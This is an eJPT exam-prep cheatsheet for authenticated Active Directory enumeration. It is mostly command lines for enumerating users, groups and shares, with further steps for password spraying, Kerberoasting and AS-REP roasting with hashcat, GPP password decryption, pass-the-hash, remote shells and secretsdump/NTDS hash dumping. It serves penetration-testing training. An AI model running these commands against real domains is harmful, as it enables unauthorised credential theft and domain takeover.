# eJPT · Authenticated AD Enumeration Cheatsheet
> You have creds. Now map everything. No flags — pure methodology.

---

## 01 · Objectives & Scenarios

| Goal | Why It Matters |
|---|---|
| **Map the domain structure** | Users, groups, OUs, computers, trusts — full picture |
| **Find sensitive data in shares** | Config files, scripts, backups with plaintext creds |
| **Identify privileged accounts** | Who is Domain Admin, local admin, service account |
| **Spot misconfigurations** | Kerberoastable accounts, AS-REP roastable, unconstrained delegation |
| **Trace privilege escalation paths** | Group memberships, ACL abuses, GPO permissions |
| **Enumerate password policy** | Safe spray rate before attempting more logins |
| **Find lateral movement targets** | Where do your creds work? Who has sessions where? |

> **Core mindset:** Low-priv domain user = read access to most of AD by default.  
> LDAP, DNS, and SMB all expose massive amounts of data to any authenticated user.  
> You don't need to be admin to enumerate — you need to be **in the domain**.

---

## 02 · Workflow & Methodology

```
[1] Validate credentials + identify DC
        ↓
[2] Enumerate domain info (LDAP / RPC)
        ↓
[3] Enumerate users, groups, computers
        ↓
[4] Check nested group memberships
        ↓
[5] Enumerate shares + hunt for sensitive files
        ↓
[6] Check password policy → spray if needed
        ↓
[7] Hunt for misconfigurations (Kerberoast, AS-REP, Delegation)
        ↓
[8] Map ACLs / admin access (BloodHound)
        ↓
[9] Lateral movement → Privilege escalation
```

---

### Step 1 — Validate Credentials & Identify DC
```bash
# Confirm creds work + get domain/OS info
crackmapexec smb <DC_IP> -u user -p 'pass'
crackmapexec smb <SUBNET>/24 -u user -p 'pass'   # find all hosts where creds work

# Find DC via DNS
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>
dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DC_IP>

# Quick domain info via LDAP
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(objectClass=domain)" \
  name defaultNamingContext

# CrackMapExec — confirm auth + get hostname/domain
crackmapexec smb <DC_IP> -u user -p pass --computers
```

---

### Step 2 — Enumerate Domain Information (LDAP)
```bash
# Get domain base DN first (needed for all ldapsearch queries)
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "" -s base "(objectClass=*)" defaultNamingContext

# Common base DN formats:
# DOMAIN.LOCAL  →  DC=domain,DC=local
# CORP.EXAMPLE.COM  →  DC=corp,DC=example,DC=com

# Full domain info
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(objectClass=domain)"

# Domain password policy
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(objectClass=domain)" \
  minPwdLength maxPwdAge lockoutThreshold lockoutDuration
```

---

### Step 3 — Enumerate Users, Groups, Computers

#### Users
```bash
# All users via CrackMapExec
crackmapexec smb <DC_IP> -u user -p pass --users

# All users via ldapsearch
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(objectClass=user)" \
  sAMAccountName displayName memberOf description pwdLastSet

# Users with description field (often contains passwords!)
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(description=*))" \
  sAMAccountName description

# Service accounts (have SPNs set — Kerberoastable)
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# AS-REP roastable accounts (no pre-auth required)
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Disabled accounts
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" \
  sAMAccountName
```

#### Groups
```bash
# All groups
crackmapexec smb <DC_IP> -u user -p pass --groups

ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(objectClass=group)" \
  sAMAccountName member description

# Domain Admins members
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=group)(sAMAccountName=Domain Admins))" member

# RPC — query group by name
rpcclient -U 'user%pass' <DC_IP> -c "querygroup 0x200"      # Domain Admins (RID 512)
rpcclient -U 'user%pass' <DC_IP> -c "querygroupmem 0x200"   # members of Domain Admins
```

#### Computers
```bash
# All computers
crackmapexec smb <DC_IP> -u user -p pass --computers

ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" "(objectClass=computer)" \
  sAMAccountName operatingSystem dNSHostName

# Find DCs specifically
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
  sAMAccountName dNSHostName
```

---

### Step 4 — Nested Group Memberships
```bash
# Check what groups a user belongs to (including nested)
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(sAMAccountName=targetuser)" memberOf

# Get all members of a group recursively (LDAP_MATCHING_RULE_IN_CHAIN)
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(member:1.2.840.113556.1.4.1941:=CN=TargetUser,CN=Users,DC=domain,DC=local)" \
  sAMAccountName

# Via rpcclient
rpcclient -U 'user%pass' <DC_IP>
> queryuser <username>
> enumdomgroups
> queryusergroups <RID>
```
> ⚠️ **Nested groups are a classic exam gotcha.** User → Group A → Group B → Domain Admins.  
> Direct member listing misses this. Always check recursively or use BloodHound.

---

### Step 5 — Share Enumeration & File Hunting
```bash
# List all shares
crackmapexec smb <TARGET_IP> -u user -p pass --shares
smbclient -U 'user%pass' -L //<TARGET_IP>

# Connect and browse
smbclient //<TARGET_IP>/ShareName -U 'user%pass'

# Inside smbclient:
> recurse ON
> ls                          # list all files recursively
> mget *                      # download everything

# Spider all shares for interesting files
crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus
crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus \
  -o READ_ONLY=false          # also flag writable files

# Search for specific file extensions
crackmapexec smb <TARGET_IP> -u user -p pass -M spider_plus \
  -o EXCLUDE_EXTS=jpg,png,gif

# Manual recursive download with smbclient
smbclient //<TARGET_IP>/Share -U 'user%pass' \
  -c 'recurse ON; prompt OFF; mget *'

# Mount share (Linux)
mount -t cifs //<TARGET_IP>/Share /mnt/share \
  -o username=user,password=pass,domain=DOMAIN

# Check SYSVOL for GPP cpasswords
smbclient //<DC_IP>/SYSVOL -U 'user%pass' -c 'recurse ON; mget *'
grep -r "cpassword" /tmp/sysvol/
gpp-decrypt <CPASSWORD_VALUE>

# Check NETLOGON for scripts
smbclient //<DC_IP>/NETLOGON -U 'user%pass' -c 'recurse ON; ls'
```

**Files to hunt for:**
| Filename Pattern | Why |
|---|---|
| `*.xml` in SYSVOL | GPP cpassword |
| `web.config`, `*.config` | DB/app passwords |
| `unattend.xml`, `sysprep.xml` | Plaintext admin passwords |
| `*.bat`, `*.ps1`, `*.vbs` | Hardcoded credentials in scripts |
| `*.txt` named `pass*`, `cred*` | Obvious credential files |
| `id_rsa`, `*.pem`, `*.key` | SSH/SSL private keys |
| `KeePass`, `*.kdbx` | Password manager databases |
| `*.bak`, `*.old`, `*.backup` | Old config files with creds |

---

### Step 6 — Password Policy + Spray
```bash
# Get policy (always before spraying)
crackmapexec smb <DC_IP> -u user -p pass --pass-pol
enum4linux-ng -P <DC_IP> -u user -p pass

# Spray (respect lockout threshold — spray max threshold-2 passwords)
crackmapexec smb <DC_IP> -u userlist.txt -p 'Password123' --continue-on-success
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Password123'
```

---

### Step 7 — Misconfiguration Hunting

#### Kerberoasting (service accounts with SPNs)
```bash
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request -outputfile kerb_hashes.txt
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### AS-REP Roasting (no pre-auth required)
```bash
GetNPUsers.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request -outputfile asrep_hashes.txt
GetNPUsers.py <DOMAIN>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Unconstrained Delegation
```bash
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  sAMAccountName dNSHostName
```

#### Constrained Delegation
```bash
ldapsearch -x -H ldap://<DC_IP> -D '<DOMAIN>\user' -w 'pass' \
  -b "DC=domain,DC=local" \
  "(msDS-AllowedToDelegateTo=*)" sAMAccountName msDS-AllowedToDelegateTo
```

---

### Step 8 — ACL / BloodHound Mapping
```bash
# Collect all AD data for BloodHound
bloodhound-python -u user -p pass -d <DOMAIN> -dc <DC_IP> -c all
bloodhound-python -u user -p pass -d <DOMAIN> -dc <DC_IP> \
  -c ACL,Session,Trusts,Group,ObjectProps,Container

# ldapdomaindump — full LDAP dump to HTML reports
ldapdomaindump <DC_IP> -u '<DOMAIN>\user' -p 'pass' -o /tmp/ldapdump/

# After importing JSON files into BloodHound GUI:
# Prebuilt queries to run:
# → "Find all Domain Admins"
# → "Shortest Paths to Domain Admins"
# → "Find Principals with DCSync Rights"
# → "Find Computers with Unconstrained Delegation"
# → "Find AS-REP Roastable Users"
# → "Find Kerberoastable Users with most privileges"
```

---

### Step 9 — Lateral Movement
```bash
# Test where creds work across the network
crackmapexec smb <SUBNET>/24 -u user -p pass --continue-on-success

# Remote shells (requires local admin on target)
psexec.py <DOMAIN>/user:pass@<TARGET>
wmiexec.py <DOMAIN>/user:pass@<TARGET>
smbexec.py <DOMAIN>/user:pass@<TARGET>
atexec.py <DOMAIN>/user:pass@<TARGET> "whoami"

# WinRM shell (port 5985 — requires WinRM access)
evil-winrm -i <TARGET> -u user -p pass
evil-winrm -i <TARGET> -u user -H <NTLM_HASH>

# Pass-the-Hash
psexec.py -hashes :<NTLM_HASH> Administrator@<TARGET>
crackmapexec smb <SUBNET>/24 -u Administrator -H <NTLM_HASH>

# Dump hashes after gaining admin access
secretsdump.py <DOMAIN>/user:pass@<TARGET>
secretsdump.py <DOMAIN>/Administrator:pass@<DC_IP>   # full domain dump
crackmapexec smb <TARGET> -u user -p pass --sam
crackmapexec smb <DC_IP>  -u user -p pass --ntds     # DC only
```

---

## 03 · Tool & Command Cheatsheet

| Tool | Key Command | What It Does | eJPT Weight |
|---|---|---|---|
| **crackmapexec** | `cme smb <IP> -u u -p p --users` | Authenticated user dump | 🔴 Critical |
| **crackmapexec** | `cme smb <IP> -u u -p p --shares` | List accessible shares | 🔴 Critical |
| **crackmapexec** | `cme smb <SUBNET>/24 -u u -p p` | Find where creds work | 🔴 Critical |
| **crackmapexec** | `cme smb <IP> -u u -p p -M spider_plus` | Spider shares for files | 🟠 High |
| **crackmapexec** | `cme smb <IP> -u u -p p --pass-pol` | Password policy | 🔴 Critical |
| **crackmapexec** | `cme smb <IP> -u u -p p --ntds` | Dump NTDS (DC only, DA needed) | 🟠 High |
| **smbclient** | `smbclient //<IP>/Share -U 'u%p'` | Browse/download share | 🔴 Critical |
| **ldapsearch** | `ldapsearch -D 'dom\u' -w p -b "DC=..." "(objectClass=user)"` | Query AD objects | 🟠 High |
| **rpcclient** | `rpcclient -U 'u%p' <IP>` | RPC queries (users/groups/policy) | 🟠 High |
| **impacket psexec** | `psexec.py domain/user:pass@<IP>` | Remote shell via SMB | 🔴 Critical |
| **impacket wmiexec** | `wmiexec.py domain/user:pass@<IP>` | Remote shell via WMI (stealthier) | 🟠 High |
| **impacket secretsdump** | `secretsdump.py domain/user:pass@<IP>` | Remote credential dump | 🔴 Critical |
| **impacket GetUserSPNs** | `GetUserSPNs.py domain/u:p -request` | Kerberoasting | 🟠 High |
| **impacket GetNPUsers** | `GetNPUsers.py domain/u:p -request` | AS-REP Roasting | 🟠 High |
| **evil-winrm** | `evil-winrm -i <IP> -u user -p pass` | WinRM shell (port 5985) | 🟠 High |
| **bloodhound-python** | `bloodhound-python -u u -p p -d dom -c all` | Full AD graph collection | 🟡 Medium |
| **ldapdomaindump** | `ldapdomaindump <IP> -u 'dom\u' -p pass` | Full LDAP dump → HTML | 🟡 Medium |
| **gpp-decrypt** | `gpp-decrypt <cpassword>` | Decrypt GPP passwords | 🟠 High |
| **kerbrute** | `kerbrute passwordspray -d dom --dc <IP> u.txt 'Pass'` | Kerberos spray | 🟡 Medium |

---

## 04 · ldapsearch Filter Reference

```bash
# ─── Base syntax ───────────────────────────────────────────────────────────
ldapsearch -x -H ldap://<DC_IP> \
  -D '<DOMAIN>\<user>' -w '<pass>' \
  -b "DC=domain,DC=local" \
  "<FILTER>" [attributes...]

# ─── Common filters ────────────────────────────────────────────────────────
# All users
(objectClass=user)

# All groups
(objectClass=group)

# All computers
(objectClass=computer)

# User by name
(sAMAccountName=john)

# Users with passwords in description
(&(objectClass=user)(description=*pass*))

# Kerberoastable (has SPN)
(&(objectClass=user)(servicePrincipalName=*))

# AS-REP roastable (DONT_REQ_PREAUTH flag)
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

# Disabled accounts
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))

# Admin accounts
(&(objectClass=user)(adminCount=1))

# Computers with unconstrained delegation
(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))

# Nested group membership (LDAP_MATCHING_RULE_IN_CHAIN)
(member:1.2.840.113556.1.4.1941:=CN=User,CN=Users,DC=domain,DC=local)

# ─── Useful attributes to request ─────────────────────────────────────────
sAMAccountName        # login name
displayName           # full name
description           # often contains passwords
memberOf              # group memberships
member                # group members
servicePrincipalName  # SPNs (Kerberoasting)
userAccountControl    # account flags
pwdLastSet            # when password was last changed
lastLogon             # last login time
adminCount            # 1 = privileged account
operatingSystem       # computer OS version
dNSHostName           # computer FQDN
```

---

## 05 · eJPT Exam Mapping

| Exam Scenario | What To Do |
|---|---|
| **Got low-priv creds from a web app / share** | Validate with CME → enumerate all shares → hunt files → spray subnet |
| **Found a readable share** | `spider_plus` → look for config files, scripts, XML with passwords |
| **Credentials in SYSVOL / NETLOGON** | Check for GPP cpassword → `gpp-decrypt` → instant admin possible |
| **Need to escalate to Domain Admin** | `GetUserSPNs.py` (Kerberoast) or BloodHound shortest path query |
| **Found NTLM hash** | Pass-the-Hash with `psexec.py -hashes` or `evil-winrm -H` — no cracking needed |
| **Found service account** | Check SPNs → Kerberoast → crack `-m 13100` → reuse creds |
| **Need shell on another host** | `crackmapexec` to find where creds work → `psexec.py` or `evil-winrm` |
| **Low-priv user in unusual group** | Check nested memberships → BloodHound "Shortest Paths" → may already be DA |
| **Description field in AD** | `ldapsearch ... "(description=*)"` — admins frequently store temp passwords here |

---

## 06 · Common Pitfalls

### 🔴 Not spraying credentials across the whole subnet
Finding creds and only testing one host is the most costly exam mistake.
```bash
# Always do this immediately after finding any credential
crackmapexec smb <SUBNET>/24 -u user -p pass --continue-on-success
```

---

### 🔴 Wrong smbclient authentication syntax
```bash
# ❌ Wrong — -P flag doesn't exist for password
smbclient //<IP>/Share -U user -P pass

# ✅ Correct — password joined to username with %
smbclient //<IP>/Share -U 'user%pass'

# ✅ Also correct — with domain
smbclient //<IP>/Share -U 'DOMAIN\user%pass'
```

---

### 🔴 Not checking the description field for passwords
AD admins routinely store temporary passwords in the user description attribute.
```bash
ldapsearch ... "(description=*)" sAMAccountName description
crackmapexec ldap <DC_IP> -u user -p pass -M get-desc-users
```

---

### 🟠 Missing nested group memberships
A user in "HelpDesk" → "IT Support" → "Domain Admins" is a DA. Listing `memberOf` once misses this.
**Fix:** Use BloodHound or `member:1.2.840.113556.1.4.1941:=` (LDAP recursive chain) to see full membership.

---

### 🟠 Ignoring SYSVOL and NETLOGON shares
These shares are readable by all domain users and frequently contain GPP cpasswords or scripts with hardcoded credentials — one of the highest-value quick wins.
```bash
smbclient //<DC_IP>/SYSVOL -U 'user%pass' -c 'recurse ON; mget *'
grep -r "cpassword" .
gpp-decrypt <VALUE>
```

---

### 🟠 Trying psexec when you only have WinRM access
`psexec.py` requires the `ADMIN$` share (local admin + SMB). If SMB admin is blocked but WinRM (5985) is open, use `evil-winrm` instead.
```bash
# Check which remote access method works
crackmapexec smb <IP> -u user -p pass      # SMB access
crackmapexec winrm <IP> -u user -p pass    # WinRM access
```

---

### 🟡 Not running ldapdomaindump for a clean overview
Raw `ldapsearch` output is hard to read. `ldapdomaindump` generates clean HTML reports you can scan instantly.
```bash
ldapdomaindump <DC_IP> -u '<DOMAIN>\user' -p 'pass' -o /tmp/ldd/
# Open domain_users_by_group.html — shows all group memberships at a glance
```

---

### 🟡 Forgetting impacket needs the domain prefix
```bash
# ❌ Wrong — auth fails silently
psexec.py user:pass@<TARGET>

# ✅ Correct
psexec.py DOMAIN/user:pass@<TARGET>
psexec.py 'DOMAIN\user':pass@<TARGET>
```

---

### 🟢 Not checking adminCount=1 for hidden privileged accounts
`adminCount=1` is set on any account that has ever been in a privileged group. These accounts are high-value targets even if they look normal.
```bash
ldapsearch ... "(&(objectClass=user)(adminCount=1))" sAMAccountName memberOf
```

---

## Quick Reference Card

```bash
# ═══ VALIDATE CREDS ═══════════════════════════════════════════════════
crackmapexec smb <DC_IP> -u user -p 'pass'
crackmapexec smb <SUBNET>/24 -u user -p 'pass' --continue-on-success

# ═══ ENUMERATE ════════════════════════════════════════════════════════
crackmapexec smb <DC_IP> -u user -p pass --users --groups --computers --pass-pol
ldapdomaindump <DC_IP> -u 'DOM\user' -p pass -o /tmp/ldd/
bloodhound-python -u user -p pass -d <DOMAIN> -dc <DC_IP> -c all

# ═══ LDAP QUICK QUERIES ═══════════════════════════════════════════════
BASE="DC=domain,DC=local"
CRED="-D 'DOM\user' -w 'pass'"
URL="ldap://<DC_IP>"

ldapsearch -x -H $URL $CRED -b "$BASE" "(objectClass=user)"      sAMAccountName description memberOf
ldapsearch -x -H $URL $CRED -b "$BASE" "(adminCount=1)"          sAMAccountName
ldapsearch -x -H $URL $CRED -b "$BASE" "(description=*pass*)"    sAMAccountName description
ldapsearch -x -H $URL $CRED -b "$BASE" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# ═══ SHARES ═══════════════════════════════════════════════════════════
crackmapexec smb <IP> -u user -p pass --shares
crackmapexec smb <IP> -u user -p pass -M spider_plus
smbclient //<IP>/Share -U 'user%pass' -c 'recurse ON; prompt OFF; mget *'
smbclient //<DC_IP>/SYSVOL -U 'user%pass' -c 'recurse ON; mget *' && grep -r cpassword .
gpp-decrypt <VALUE>

# ═══ MISCONFIGURATIONS ════════════════════════════════════════════════
GetUserSPNs.py <DOMAIN>/user:pass -dc-ip <DC_IP> -request -outputfile kerb.txt
GetNPUsers.py  <DOMAIN>/user:pass -dc-ip <DC_IP> -request -outputfile asrep.txt
hashcat -m 13100 kerb.txt  rockyou.txt   # Kerberoast
hashcat -m 18200 asrep.txt rockyou.txt   # AS-REP roast

# ═══ SHELLS ═══════════════════════════════════════════════════════════
psexec.py  <DOMAIN>/user:pass@<TARGET>
wmiexec.py <DOMAIN>/user:pass@<TARGET>
evil-winrm -i <TARGET> -u user -p pass

# ═══ PASS-THE-HASH ════════════════════════════════════════════════════
crackmapexec smb <SUBNET>/24 -u Administrator -H <HASH>
psexec.py  -hashes :<HASH> Administrator@<TARGET>
evil-winrm -i <TARGET> -u Administrator -H <HASH>

# ═══ DUMP HASHES ══════════════════════════════════════════════════════
secretsdump.py <DOMAIN>/user:pass@<TARGET>      # local SAM
secretsdump.py <DOMAIN>/Administrator:pass@<DC>  # full NTDS
crackmapexec smb <TARGET> -u user -p pass --sam
crackmapexec smb <DC_IP>  -u user -p pass --ntds
```

---

*Validate → Enumerate → Hunt Shares → Check Misconfigs → Move Laterally → Escalate*
